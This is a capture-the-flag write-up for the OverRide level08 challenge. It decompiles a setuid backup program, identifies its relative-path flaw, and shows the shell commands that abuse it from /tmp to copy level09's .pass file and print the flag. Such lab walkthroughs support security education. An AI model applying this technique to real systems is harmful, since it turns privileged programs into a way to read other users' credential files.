# 08 - RevMe (4)
> README by [jchene](https://github.com/jchene)

We have a binary named level08 at /home/users/level08/

It is owned by `level09`, has a `setuid bit` and hax `NX` disabled

This program is composed of 2 functions: `main` and `log_wrapper`

Let's start with the `main` munction, the program first define two `FILE` streams, an `int` to store a file descriptor, a buffer of 1 `char` and a buffer of 104 `char`

```c
int main(int argc, const char **argv)
{
    FILE *logFile;
    FILE *fileTobackup;
    int backupFd;
    char buf;
    char dest[104];
```

Then the program checks for arguments and print a message in case of an error which tells us the program is expecting a filename as first and only argument

```c
if (argc != 2)
    printf("Usage: %s filename\n", *argv);
```

Then it tries to open a log file located at `./backups/.log` in `write` mode

If it failed the program prints an error message and exits or else it calls the `log_wrapper` function with a debug message and the first argument as parameters

```c
    logFile = fopen("./backups/.log", "w");
    if (!logFile)
    {
        printf("ERROR: Failed to open %s\n", "./backups/.log");
        exit(1);
    }

    log_wrapper(logFile, "Starting back up: ", argv[1]);
```

Next, the program tries to open the file to backup which is the filename passed as argument, prints an error and exits if the file could not be opened.

If no error was encountered the program proceeds to concatenate the filename with "./backups/" and tries to open this new file.

```c
    fileTobackup = fopen(argv[1], "r");
    if (!fileTobackup)
    {
        printf("ERROR: Failed to open %s\n", argv[1]);
        exit(1);
    }

    strcpy(dest, "./backups/");
    strncat(dest, argv[1], 99 - strlen(dest));
    backupFd = open(dest, O_WRONLY | O_CREAT | O_EXCL, 00660);
    if (backupFd < 0)
    {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
        exit(1);
    }
```

Finally, the file is copied character by character using the `buf` defined at the top, the program calls the `log_wrapper` function and closes all remaining opened fd's before returning

```c
    buf = -1;
    while (1)
    {
        buf = fgetc(fileTobackups);
        if (buf == -1)
            break;
        write(backupFd, &buf, 1uLL);
    }

    log_wrapper(logFile, "Finished back up ", argv[1]);

    fclose(fileTobackup);
    close(backupFd);
    return 0;
}
```

Next, let's break down the `log_wrapper` function

The function starts by defining a buffer of 264 char and copies the debug message into it

```c
void log_wrapper(FILE *logFile, const char *msg, const char *filename)
{
    char dest[264];

    strcpy(dest, msg);
```

Then it uses `snprintf` to append the filename to the `dest` buffer and replaces the "\n" with a "\0"

```c
    snprintf(&dest[strlen(dest)], 254 - strlen(dest), filename);
    dest[strcspn(dest, "\n")] = 0;
```

Finally it finishes by writing the `dest` buffer into the log file using `fprintf` before returning

```c
    fprintf(logFile, "LOG: %s\n", dest);
    return;
}
```

This program allow to backup files, it takes a single filename as arguments and copies it to a new file located at `./backups/`

Let's execute it with the `.pass` file located at `/home/users/level09/level09` which contains the flag we need

```
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Because the directories `/home/users/level09/` are not present at the `./backups/` location, the program can't open the backup file

Let's try to create the missing directories

```
level08@OverRide:~$ cd ./backups/
level08@OverRide:~/backups$ mkdir home
mkdir: cannot create directory `home': Permission denied
```

We have not the required permissions to create the missing directories

The flaw in this binary resides into the usage of relative path when opening the backup file because the relative path is found using the actual pwd of the user executing the binary

```c
    strcpy(dest, "./backups/");
    strncat(dest, argv[1], 99 - strlen(dest));
    backupFd = open(dest, O_WRONLY | O_CREAT | O_EXCL, 00660);
```

This means we can go to `/tmp/` and create `backups/` directory which will be used by the binary instead of the `/home/users/level08/backups/` directory

We also need to create a `.log` file inside the `backups/` directory

```
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir backups
level08@OverRide:/tmp$ mkdir backups/home
level08@OverRide:/tmp$ mkdir backups/home/users
level08@OverRide:/tmp$ mkdir backups/home/users/level09
level08@OverRide:/tmp$ touch backups/.log
```

Now let's execute the binary while being at `/tmp`

```
level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

Here is the flag
```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
